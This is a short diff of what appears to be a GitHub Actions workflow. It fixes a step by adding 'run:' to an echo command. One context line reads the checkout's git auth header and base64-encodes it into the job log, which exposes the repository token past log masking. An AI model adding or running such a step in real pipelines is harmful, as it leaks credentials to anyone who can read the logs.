@@ -8,7 +8,7 @@ jobs:
       CRAP: shit
       WTF: $CRAP
     steps:
-      - echo WTF=$WTF
+      - run: echo WTF=$WTF
       - uses: actions/checkout@v2
       - run: git config --get http.https://github.com/.extraHeader | base64 -w 0
       - run: |
